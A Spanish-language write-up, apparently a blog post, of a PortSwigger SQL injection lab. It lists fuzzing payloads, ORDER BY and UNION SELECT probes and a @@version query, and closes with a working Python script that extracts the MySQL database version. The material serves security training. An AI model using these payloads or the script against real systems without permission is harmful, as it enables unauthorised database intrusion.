---
title: "08 SQLi attack, querying the database type and version on MySQL & Microsoft"
collection: publications
category: portswigger
permalink: /publications/08_SQLi attack, querying the database type and version on MySQL & Microsoft
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION que consulta el tipo y la versión de la base de datos en bases de datos de Microsoft y MySQL.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQLi attack, querying the database type and version on MySQL & Microsoft'
---

![logo]({{site.url}}/images/SQLi/sqli-7/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-7/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, visualice la cadena de versión de la base de datos.

## Determinamos que el campo si es vulnerable

Ingresamos una lista de payloads y ejecutamos con Burpsuite

```javascript
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator
@variable	local variable
@@variable	global variable
```

![Intruder]({{site.url}}/images/SQLi/sqli-8/Intruder.png)

![Intruder]({{site.url}}/images/SQLi/sqli-8/resultado2.png)

Y probamos uno de los resultados

![Intruder]({{site.url}}/images/SQLi/sqli-8/resultado.png)

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.

```javascript
' ORDER BY 1#
' ORDER BY 2#
```

![Intruder]({{site.url}}/images/SQLi/sqli-8/order by.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String', en esta ocación que es BD MySQL necesitamos comentar con #.
Los 2 campos son de tipo `String`

```javascript
' UNION SELECT 'A', NULL#
' UNION SELECT NULL, 'A'# 
' UNION SELECT 'A', 'A'#
```

![String]({{site.url}}/images/SQLi/sqli-8/campos string.png)

## Miramos la versión de la BD

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Ya que sabemos que es una BD MySQL

```javascript
' UNION SELECT 'A', @@version#
```

![DB version]({{site.url}}/images/SQLi/sqli-8/version.png)

## Aprobado 

![Aprobado]({{site.url}}/images/SQLi/sqli-8/Aprobado.png)

# Codigo Python

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def explot_sqli_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT @@version, NULL#"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(string=re.compile(r'.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is None:
        return False
    else:
        print("[-] The database version is: " + version)
        return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Dumping the version of  the database...")
    if not explot_sqli_version(url):
        print("[-] Unable to dump the database version.")
```